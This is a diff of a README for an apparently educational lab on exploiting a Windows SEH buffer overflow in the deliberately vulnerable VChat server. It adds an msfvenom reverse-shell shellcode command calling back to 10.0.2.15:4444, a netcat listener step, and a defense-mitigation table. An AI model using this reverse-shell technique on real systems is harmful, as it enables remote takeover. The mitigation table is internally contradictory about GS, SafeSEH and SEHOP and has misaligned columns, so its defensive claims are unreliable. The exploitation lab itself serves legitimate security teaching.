@@ -3,6 +3,7 @@
 > - The following exploit and its procedures are based on an original [Blog](https://fluidattacks.com/blog/vulnserver-gmon/) from fluid attacks.
 > - Disable Windows *Real-time protection* at *Virus & threat protection* -> *Virus & threat protection settings*.
 > - Don't copy the *$* sign when copying and pasting a command in this tutorial.
+> - Offsets may vary depending on what version of VChat was compiled, the version of the compiler used and any compiler flags applied during the compilation process.
 ___
 
 Not all buffer overflows will be capable of directly overflowing the return address to modify the `eip` register in order to gain control of the flow of execution without rasing an exception that causes us to never reach the `RETN` instruction. So how do we account for this? When exploiting a Windows system we may be able to use the behavior of the [Structured Exception Handling](https://learn.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170) (SEH) feature provided by Microsoft that allows for languages like C to have a common exception handling paradigm; namely the `try-catch-finally` blocks.
@@ -90,9 +91,9 @@ The following sections cover the process that should (Or may) be followed when p
 ### Information Collecting
 We want to understand the VChat program and how it works in order to effectively exploit it. Before diving into the specific of how VChat behaves the most important information for us is the IP address of the Windows VM that runs VChat and the port number that VChat runs on.
 
-1. Launch the VChat application. 
+1. **Windows** Launch the VChat application. 
 	* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll.
-2. **Linux**: Run NMap
+2. (Optional) **Linux**: Run NMap
 	```sh
 	# Replace the <IP> with the IP of the machine.
 	$ nmap -A <IP>
@@ -128,7 +129,7 @@ This phase of exploitation is where we launch the target application's binary or
 > [!IMPORTANT]
 > If you have disabled exceptions for the [EggHunting](https://github.com/DaintyJet/VChat_GTER_EggHunter) exploit, that is we passed all exceptions through the debugger to the VChat process. You should uncheck those options so Immunity Debugger can catch the exceptions, allowing us to see the state of the program at a crash. See step 2 of the [Launch VChat](#launch-vchat) section!
 #### Launch VChat
-1. Open Immunity Debugger
+1. Open Immunity Debugger.
 
 	<img src="Images/I1.png" width=800>
 
@@ -150,7 +151,7 @@ This phase of exploitation is where we launch the target application's binary or
 	   <img src="Images/I1e.png" width = 200>
 
 3. Attach VChat: There are two options!
-   1. When the VChat is already Running
+   1. (Optional) When the VChat is already Running
         1. Click File -> Attach
 
 			<img src="Images/I2a.png" width=200>
@@ -371,6 +372,8 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 Now that we have all the necessary parts for the creation of an exploit, we will add the shellcode to our payload and gain access to a reverse shell!
 ### Exploitation
+Up until this point in time,  we have been performing [Denial of Service](https://attack.mitre.org/techniques/T0814/) (DoS) attacks. Since we simply overflowed the stack with what is effectively garbage address values (a series of `A`s, `B`s and `C`s) all we have done with our exploits is crash the VChat server directly or indirectly after our jump instructions lead to an invalid operation. Now, we have all the information necessary to control the flow of VChat's execution, allowing us to inject [Shellcode](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/) and perform a more meaningful attack.
+
 1. Now We will need to create a reverse shell we can include in the payload, this is a program that reaches out and makes a connection to the attacker's machine (or one they control) from target machine and provides a shell to the attacker. We can generate the shellcode with the following command.
 	```
 	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=seh -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
@@ -411,6 +414,59 @@ Now that we have all the necessary parts for the creation of an exploit, we will
 4. Now run netcat and use the reverse shell: `nc -lv -p 4444`.
 
       <img src="Images/I32.png" width=600>
+
+
+## Attack Mitigation Table
+In this section we will discuss the effects a variety of defenses would have on *this specific attack* on the VChat server, specifically we will be discussing their effects on a buffer overflow that overwrites a SEH record and attempts to execute shellcode that has been written to the stack. We will make a note that some mitigations may be bypassed if the target application contains additional vulnerabilities such as a [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack), or by using more complex exploits like [Return Oriented Programming (ROP)](https://github.com/DaintyJet/VChat_TRUN_ROP).
+
+First we will examine the effects individual defenses have on this exploit, and then we will examine the effects a combination of these defenses would have on the VChat exploit.
+
+The mitigations we will be using in the following examination are:
+* [Buffer Security Check (GS)](https://github.com/DaintyJet/VChat_Security_Cookies): Security Cookies are inserted on the stack to detect when critical data such as the base pointer, return address or arguments have been overflowed. Integrity is checked on function return.
+* [Data Execution Prevention (DEP)](https://github.com/DaintyJet/VChat_DEP_Intro): Uses paged memory protection to mark all non-code (.text) sections as non-executable. This prevents shellcode on the stack or heap from being executed as an exception will be raised.
+* [Address Space Layout Randomization (ASLR)](https://github.com/DaintyJet/VChat_ASLR_Intro): This mitigation makes it harder to locate where functions and datastructures are located as their region's starting address will be randomized. This is only done when the process is loaded, and if a DLL has ASLR enabled it will only have it's addresses randomized again when it is no longer in use and has been unloaded from memory.
+* [SafeSEH](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates that the exception handler we would like to execute is contained in a table generated at compile time. 
+* [SEHOP](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates the integrity of the SEH chain during a runtime check.
+* [Control Flow Guard (CFG)](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that indirect calls or jumps are preformed to locations contained in a table generated at compile time. Examples of indirect calls or jumps include function pointers being used to call a function, or if you are using `C++` virtual functions would be considered indirect calls as you index a table of function pointers. 
+* [Heap Integrity Validation](https://github.com/DaintyJet/VChat_Heap_Defense): This mitigation verifies the integrity of a heap when operations are preformed on the heap itself, such as allocations or frees of heap objects.
+* [Control Flow Guard](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that the target of an indirect jump or call is a member of a whitelist generated at compile time.
+### Individual Defenses: VChat Exploit 
+This exploit is similar to all the previous exploits except that an exception is raised before the function can exit and return normally. This means the exception handling mechanism is triggered due to some operation preformed at runtime.
+
+|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Space Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG) |  
+|-|-|-|-|-|-|-|-|
+|No Effect| | |X |X |X | X| X| X|
+|Partial Mitigation| | |X| | | | | |
+|Full Mitigation| |X| | | | | | | |
+---
+|Mitigation Level|Defenses|
+|-|-|
+|No Effect|SafeSEH, SEHOP, Heap Integrity Validation, and Control Flow Guard (CFG)|
+|Partial Mitigation|Address Space Layout Randomization|
+|Full Mitigation|Buffer Security Checks (GS) ***or*** Data Execution Prevention (DEP)|
+
+
+
+* `Defense: Buffer Security Check (GS)`: This mitigation strategy proves effective against stack based buffer overflows that overwrite the return address or arguments of a function. This is because the randomly generated security cookie is placed before the return address and it's integrity is validated before the return address is loaded into the `EIP` register. As the security cookie is placed before the return address in order for us to overflow the return address we would have to corrupt the security cookie allowing us to detect the overflow. As the SEH Record is contained deeper in the stack in order to overwrite it we would overwrite the security cookie. However as we do not return this mitigation is never verified.
+* `Defense: Data Execution Prevention (DEP)`: This mitigation strategy proves effective against stack based buffer overflows that attempt to **directly execute** shellcode located on the stack as this would raise an exception.
+* `Defense: Address Space Layout Randomization (ASLR)`: This does not affect our exploit as we do not require the addresses of external libraries or the addresses of internal functions. The jumps that we preform as part of the exploit are *relative* and compute where the flow of execution is directed to based on the current location.
+* `Defense: SafeSEH`: This would prove effective as long as the SEH chain overflowed is contained in a module that has SAFESEH enabled as the handler in the SEH record would no longer point to an address contained in the SAFESEH table.
+* `Defense: SEHOP`: This would prove effective as overflowing the SEH handler would overwrite the next pointer, breaking the SEH chain which means the SEHOP mitigation would be unable to verify the SEH chain by traversing from the start till the end.
+* `Defense: Heap Integrity Validation`: This does not affect our exploit as we do not leverage the Windows Heap.
+* `Defense: Control Flow Guard`: This does not affect our exploit as we do not leverage indirect calls or jumps. 
+> [!NOTE]
+> `Defense: Buffer Security Check (GS)`: If the application improperly initializes the global security cookie, or contains additional vulnerabilities that can leak values on the stack then this mitigation strategy can be bypassed.
+>
+> `Defense: Data Execution Prevention (DEP)`: If the attacker employs a [ROP Technique](https://github.com/DaintyJet/VChat_TRUN_ROP) then this defense can by bypassed.
+>
+> `Defense: Address Space Layout Randomization (ASLR)`: This defense can be bypassed if the attacker can leak addresses, or they may brute force the offsets of functions they are calling in the shellcode. This mitigation does not prevent the exploit, but simply makes it harder and less reliable.
+ ### Combined Defenses: VChat Exploit
+|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG)|
+|-|-|-|-|-|-|-|-|
+|Defense: Data Execution Prevention (DEP)|**No Increase**: As the function does not return, we do not verify the integrity of the security cookie.|X| **No Increase**: The randomization of addresses does not affect the protections provided by DEP.|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**No Increase**: The windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited. | |
+|Defense: SafeSEH|**No Increase**: As the function does not return, we do not verify the integrity of the security cookie.|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**No Increase**: We do not directly use external functions, and any jumps are relative. |X|**Increased Security**: Combining two effective mitigations provides the benefits of both. In this case if SafeSEH were to be bypassed SEHOP may catch this.|**No Increase**: The Windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited.| |
+|Defense: SEHOP|**No Increase**: As the function does not return, we do not verify the integrity of the security cookie.|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**No Increase**: We do not directly use external functions, and any jumps are relative.|**Increased Security**: Combining two effective mitigations provides the benefits of both. In this case if SEHOP were to be bypassed SafeSEH may catch this.|X|**No Increase**: The Windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited.| |
+
 
 ## VChat Code
 
